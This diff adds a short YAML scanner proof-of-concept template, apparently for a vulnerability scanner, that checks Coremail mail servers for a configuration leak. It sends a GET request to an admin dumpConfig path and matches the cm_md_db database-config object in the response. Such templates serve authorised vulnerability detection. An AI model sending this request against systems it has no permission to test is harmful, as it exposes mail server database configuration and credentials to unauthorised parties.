@@ -1,0 +1,17 @@
+name: yaml-poc-coremail-coremail-leak-CT-158053
+binding: 1803e9bd-c252-4e02-a42b-3c21f0dcaa1e
+detail:
+    author: system_user
+    vulnerability:
+        id: 5f793841-8b26-4b4e-a44d-1796dad73199
+        level: high
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /mailsms/s?func=ADMIN:appState&dumpConfig=/
+            follow_redirects: false
+        expression: response.status == 200 && response.body.bcontains(bytes("<object name=\"cm_md_db\">"))
+expression: r0()
